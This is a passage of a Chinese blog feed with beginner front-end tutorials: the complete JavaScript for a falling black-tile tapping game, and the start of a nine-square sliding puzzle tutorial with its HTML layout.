class="property">pass</span> = <span class="number">1</span>; <span class="comment">//定义属性pass，表明此行row的黑块已经被点击</span></span><br><span class="line">    <span class="title function_">score</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其实程序写到这里，几个核心的功能点都已经实现了，是不是感觉很简单呢。剩下来的就是将这些方法组合起来，组成完整的逻辑关系，在我给出的源码里添加有一个记分器记录用户分数的功能，同时设置加速方法，使黑块的移动越来越快等等。有兴趣的的同学可以尝试着添加事件按钮，使这个游戏更接近 APP 版本。</p><h4 id="js-完整代码"><a href="#js-完整代码" class="headerlink" title="js 完整代码"></a>js 完整代码</h4><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 工具封装</span></span><br><span class="line"><span class="comment">// 根据id来获取元素</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">id</span>) {</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(id);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建div, className是其类名</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">className</span>) {</span><br><span class="line">  <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">'div'</span>);</span><br><span class="line">  div.<span class="property">className</span> = className;</span><br><span class="line">  <span class="keyword">return</span> div;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">var</span> clock = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> state = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> speed = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//点击开始游戏按钮 开始游戏</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">if</span> (!flag) {</span><br><span class="line">    <span class="title function_">init</span>();</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">'游戏已经开始，无须再次点击！'</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *    初始化 init</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) {</span><br><span class="line">  flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) {</span><br><span class="line">    <span class="title function_">createrow</span>();</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加onclick事件</span></span><br><span class="line">  $(<span class="string">'main'</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params">ev</span>) {</span><br><span class="line">    ev = ev || event;</span><br><span class="line">    <span class="title function_">judge</span>(ev);</span><br><span class="line">  };</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定时器 每30毫秒调用一次move()</span></span><br><span class="line">  clock = <span class="variable language_">window</span>.<span class="built_in">setInterval</span>(<span class="string">'move()'</span>, <span class="number">30</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否点击黑块、白块</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">ev</span>) {</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'black'</span>) == -<span class="number">1</span> &amp;&amp;</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'cell'</span>) !== -<span class="number">1</span></span><br><span class="line">  ) {</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass1</span> = <span class="number">1</span>; <span class="comment">//定义属性pass，表示此行row的白块已经被点击</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'black'</span>) !== -<span class="number">1</span>) {</span><br><span class="line">    <span class="comment">//点击目标元素 类名中包含 black 说明是黑块</span></span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span> = <span class="string">'cell'</span>;</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass</span> = <span class="number">1</span>; <span class="comment">//定义属性pass，表明此行row的黑块已经被点击</span></span><br><span class="line">    <span class="title function_">score</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断游戏是否结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> rows = con.<span class="property">childNodes</span>;</span><br><span class="line">  <span class="keyword">if</span> (rows.<span class="property">length</span> == <span class="number">5</span> &amp;&amp; rows[rows.<span class="property">length</span> - <span class="number">1</span>].<span class="property">pass</span> !== <span class="number">1</span>) {</span><br><span class="line">    <span class="title function_">fail</span>();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rows.<span class="property">length</span>; i++) {</span><br><span class="line">    <span class="keyword">if</span> (rows[i].<span class="property">pass1</span> == <span class="number">1</span>) {</span><br><span class="line">      <span class="title function_">fail</span>();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 游戏结束</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="built_in">clearInterval</span>(clock);</span><br><span class="line">  flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="title function_">confirm</span>(<span class="string">'你的最终得分为 '</span> + <span class="built_in">parseInt</span>($(<span class="string">'score'</span>).<span class="property">innerHTML</span>));</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  con.<span class="property">innerHTML</span> = <span class="string">''</span>;</span><br><span class="line">  $(<span class="string">'score'</span>).<span class="property">innerHTML</span> = <span class="number">0</span>;</span><br><span class="line">  con.<span class="property">style</span>.<span class="property">top</span> = <span class="string">'-408px'</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创造一个&lt;div class="row"&gt;并且有四个子节点&lt;div class="cell"&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">var</span> row = <span class="title function_">creatediv</span>(<span class="string">'row'</span>); <span class="comment">//创建div className=row</span></span><br><span class="line">  <span class="keyword">var</span> arr = <span class="title function_">creatcell</span>(); <span class="comment">//定义div cell的类名,其中一个为cell black</span></span><br><span class="line"></span><br><span class="line">  con.<span class="title function_">appendChild</span>(row); <span class="comment">// 添加row为con的子节点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) {</span><br><span class="line">    row.<span class="title function_">appendChild</span>(<span class="title function_">creatediv</span>(arr[i])); <span class="comment">//添加row的子节点 cell</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (con.<span class="property">firstChild</span> == <span class="literal">null</span>) {</span><br><span class="line">    con.<span class="title function_">appendChild</span>(row);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    con.<span class="title function_">insertBefore</span>(row, con.<span class="property">firstChild</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个类名的数组，其中一个为cell black, 其余为cell</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatcell</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> temp = [<span class="string">'cell'</span>, <span class="string">'cell'</span>, <span class="string">'cell'</span>, <span class="string">'cell'</span>];</span><br><span class="line">  <span class="keyword">var</span> i = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">4</span>); <span class="comment">//随机产生黑块的位置 Math.random()函数参数 0~1的随机数</span></span><br><span class="line">  temp[i] = <span class="string">'cell black'</span>;</span><br><span class="line">  <span class="keyword">return</span> temp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//让黑块动起来</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">var</span> top = <span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(con, <span class="literal">null</span>)[<span class="string">'top'</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (speed + top &gt; <span class="number">0</span>) {</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    top += speed;</span><br><span class="line">  }</span><br><span class="line">  con.<span class="property">style</span>.<span class="property">top</span> = top + <span class="string">'px'</span>; <span class="comment">//不断移动top值，使它动起来</span></span><br><span class="line">  <span class="title function_">over</span>();</span><br><span class="line">  <span class="keyword">if</span> (top == <span class="number">0</span>) {</span><br><span class="line">    <span class="title function_">createrow</span>();</span><br><span class="line">    con.<span class="property">style</span>.<span class="property">top</span> = <span class="string">'-102px'</span>;</span><br><span class="line">    <span class="title function_">delrow</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加速函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>) {</span><br><span class="line">  speed += <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (speed == <span class="number">20</span>) {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">'你超神了'</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除某行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">if</span> (con.<span class="property">childNodes</span>.<span class="property">length</span> == <span class="number">6</span>) {</span><br><span class="line">    con.<span class="title function_">removeChild</span>(con.<span class="property">lastChild</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记分</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">score</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> newscore = <span class="built_in">parseInt</span>($(<span class="string">'score'</span>).<span class="property">innerHTML</span>) + <span class="number">1</span>; <span class="comment">//分数加一</span></span><br><span class="line">  $(<span class="string">'score'</span>).<span class="property">innerHTML</span> = newscore; <span class="comment">//修改分数</span></span><br><span class="line">  <span class="keyword">if</span> (newscore % <span class="number">10</span> == <span class="number">0</span>) {</span><br><span class="line">    <span class="comment">//当分数是10 的倍数时使用加速函数，越来越快</span></span><br><span class="line">    <span class="title function_">speedup</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>仅仅一百多行代码我们就实现了一个简单有趣的 Web 小游戏。如果你刚入门前端，相信本项目可以很好的让你理解，练习如何使用 JavaScript 操作 DOM.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>h5拼图小游戏</title>
      <link href="/posts/22493/"/>
      <url>/posts/22493/</url>
      
        <content type="html"><![CDATA[<h1 id="内容介绍"><a href="#内容介绍" class="headerlink" title="内容介绍"></a>内容介绍</h1><h4 id="1-1-学习内容"><a href="#1-1-学习内容" class="headerlink" title="1.1 学习内容"></a>1.1 学习内容</h4><p>本项目是基于 HTML+CSS+JavaScript 实现网页版的拼图游戏。实现过程中将用到 HTML5，CSS3 及 JavaScript 相关知识。完成这个项目，可以进一步扎实前端基础知识。</p><p>九宫格拼图相信大家都玩过了，看似简单的小游戏，但实现起来其实并不那么简单。在以前，写程序是程序员的专利，只有他们才能做出一个软件来。但是现在不同了。科技的进步和经济的发展，使得每个人都可以使用计算机。特别是 HTML5 和 CSS3 的流行，使得制作一个基本的游戏变得简单。</p><p>下面我们就来做一个九宫格拼图。它的玩法是移动空格块旁边的方块，使得它们按照方块上面标的数字顺序排好。最终的效果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/22493/document-uid920932labid465timestamp1551234014316.png" alt="此处输入图片的描述"></p><h4 id="1-2-实验知识点"><a href="#1-2-实验知识点" class="headerlink" title="1.2 实验知识点"></a>1.2 实验知识点</h4><p>本实验涉及以下知识点：</p><ul><li>HTML5</li><li>CSS3</li><li>JavaScript</li></ul><h4 id="1-3-实验环境"><a href="#1-3-实验环境" class="headerlink" title="1.3 实验环境"></a>1.3 实验环境</h4><ul><li>Vscode</li></ul><h4 id="1-4-适合人群"><a href="#1-4-适合人群" class="headerlink" title="1.4 适合人群"></a>1.4 适合人群</h4><p>本项目难度一般，适合刚学完前端基础（HTML+CSS+JavaScript）的同学作为练手项目。</p><h4 id="1-5-代码获取"><a href="#1-5-代码获取" class="headerlink" title="1.5 代码获取"></a>1.5 代码获取</h4><p>附件：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puzzle.zip</span><br></pre></td></tr></tbody></table></figure><h1 id="项目原理"><a href="#项目原理" class="headerlink" title="项目原理"></a>项目原理</h1><p>根据下面的效果图来观察思考，我们要做的就是设置一个大 DIV 用来包裹里面的小 DIV，然后在里面设置 8 个小 DIV，从 1 开始给他们编号。右边设置两个按钮，点击开始的时候开始计时，完成拼图后停止计时，并弹出一个框，提示完成了。重来按钮是当用户觉得当前有难度的时候，点击重来可以重新开始一个新的拼图，把所有方块打乱顺序，然后开始计时。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/22493/document-uid920932labid465timestamp1551234094402.png" alt="此处输入图片的描述"></p><p>我们的重点就是当鼠标点击其中一个方块时，要判断当前方块是否可移动，如果可移动，则移动到相应的位置，如不可移动，则不做任何事。当移动完一块后，要判断是否完成拼图。</p><p>我们把那个大 DIV 想象成一个盒子，它有九个位置，从 1 开始，到 9 编号，他们的位置和编号都是不会变的。把里面的 8 个小 DIV 想象成 8 个小盒子，给他们设置 top 和 left 就可以控制他们的位置。每个小 DIV 从 1 开始到 8 编号。他们的位置是可以随意改变的。所以当小 DIV 的编号和大 DIV 的编号全部重合时，就完成了拼图。</p><p>所以重点就只有一个了。那就是如何判断是否可移动。这个也简单。我们设置一个一维数组变量，用来保存大 DIV 它里面装的小 DIV 的编号。如果大 DIV 没有小方块，也就表面它是空白块，那么就设为 0。如果当前大 DIV 有小 DIV，那就设置为小 DIV 的编号。然后再设置一个二维数组变量，用来保存大 DIV 的可移动编号。也就是保存这个大 DIV 它所有的可去的位置。比如大 DIV 编号为 2 的，它只能向 1 号，3 号，5 号这三个方向移动。又比如 5，它能向 2、4、6、8 这四个方向移动。我们循环遍历这个变量，如果对应的方向它 没有方块，也就是值为 0，那么它就可以往这个方向移动了。</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>1.准备相关开发工具</p><p>2.建立下面的目录结构：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puzzle</span><br><span class="line">  |__puzzle.html</span><br><span class="line">  |__puzzle.css</span><br><span class="line">  |__puzzle.js</span><br></pre></td></tr></tbody></table></figure><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><h4 id="1-编写布局"><a href="#1-编写布局" class="headerlink" title="1.编写布局"></a>1.编写布局</h4><p>在<strong>puzzle.html</strong>中我们有下面的代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Puzzle<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"puzzle.css"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"puzzle.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--最外面的DIV，用来包含里面的结构--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"game"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--游戏区，也就是大DIV方块--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d1"</span> <span class="attr">onclick</span>=<span class="string">"move(1)"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--小DIV，也就是8个小方块。当点击的时候执行move()函数，参数是显示的编号，这样我们就知道点击了那个方块--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d2"</span> <span class="attr">onclick</span>=<span class="string">"move(2)"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d3"</span> <span class="attr">onclick</span>=<span class="string">"move(3)"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d4"</span> <span class="attr">onclick</span>=<span class="string">"move(4)"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d5"</span> <span class="attr">onclick</span>=<span class="string">"move(5)"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d6"</span> <span class="attr">onclick</span>=<span class="string">"move(6)"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d7"</span> <span class="attr">onclick</span>=<span class="string">"move(7)"</span>&gt;</span>7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d8"</span> <span class="attr">onclick</span>=<span class="string">"move(8)"</span>&gt;</span>8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"control"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--游戏控制区--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">rowspan</span> <span class="attr">id</span>=<span class="string">"timeText"</span>&gt;</span>总用时<span class="tag">&lt;/<span class="name">rowspan</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">rowspan</span> <span class="attr">id</span>=<span class="string">"timer"</span>&gt;</span><span class="tag">&lt;/<span class="name">rowspan</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--显示游戏时间区域--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">rowspan</span> <span class="attr">id</span>=<span class="string">"start"</span> <span class="attr">onclick</span>=<span class="string">"start()"</span>&gt;</span>开始<span class="tag">&lt;/<span class="name">rowspan</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">rowspan</span> <span class="attr">id</span>=<span class="string">"reset"</span> <span class="attr">onclick</span>=<span class="string">"reset()"</span>&gt;</span>重来<span class="tag">&lt;/<span class="name">rowspan</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--显示控制按钮区域--&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>布局文件就写完了。这里为了简化逻辑，更易编写代码，我们把所有操作都封装了。只要执行 move(2)，就是点击了编号为 2 的小方块，后面的一系列操作都完成了。</p><h4 id="2-编写样式"><a href="#2-编写样式" class="headerlink" title="2.编写样式"></a>2.编写样式</h4><p>布局写完了，现在我们为游戏编写样式，使得它更漂亮。在这一步，大家就可以自己自由发挥了，你可以写出自己的风格，让游戏更漂亮。也可以添加更多的元素来装饰你的游戏。但是注意了，游戏 DIV 的大小如果改变了，一定要记得修改 js 代码，稍后我们会详细讲解。</p><p><strong>puzzle.css</strong></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 